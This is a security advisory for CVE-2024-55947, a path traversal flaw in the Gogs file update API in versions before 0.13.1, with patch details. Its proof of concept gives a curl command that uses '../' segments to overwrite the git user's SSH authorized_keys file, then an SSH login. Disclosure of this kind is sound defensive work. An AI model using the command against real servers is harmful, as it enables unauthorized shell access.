# Path Traversal in file update API in gogs

**GHSA**: GHSA-qf5v-rp47-55gg | **CVE**: CVE-2024-55947 | **Severity**: high (CVSS 8.8)

**CWE**: CWE-22

**Affected Packages**:
- **gogs.io/gogs** (go): < 0.13.1

## Description

### Impact

The malicious user is able to write a file to an arbitrary path on the server to gain SSH access to the server. 

### Patches

Writing files outside repository Git directory has been prohibited via the repository file update API (https://github.com/gogs/gogs/pull/7859). Users should upgrade to 0.13.1 or the latest 0.14.0+dev.

### Workarounds

No viable workaround available, please only grant access to trusted users to your Gogs instance on affected versions.

### References

n/a

### Proof of Concept

1. Generate a Personal Access Tokens
2. Edit any file on the server with this

    ```bash
    curl -v --path-as-is -X PUT --url "http://localhost:10880/api/v1/repos/Test/bbcc/contents/../../../../../../../../home/git/.ssh/authorized_keys" \
    -H "Authorization: token eaac23cf58fc76bbaecd686ec52cd44d903db9bf" \
    -H "Content-Type: application/json" \
    --data '{
      "message": "an",
      "content": "<base64encoded: your ssh pub key>"
    }'
    ```

3. ssh connect to remote server

    ```bash
    ssh -i temp git@localhost -p 10022
    ```

### For more information
If you have any questions or comments about this advisory, please post on https://github.com/gogs/gogs/issues/7582.
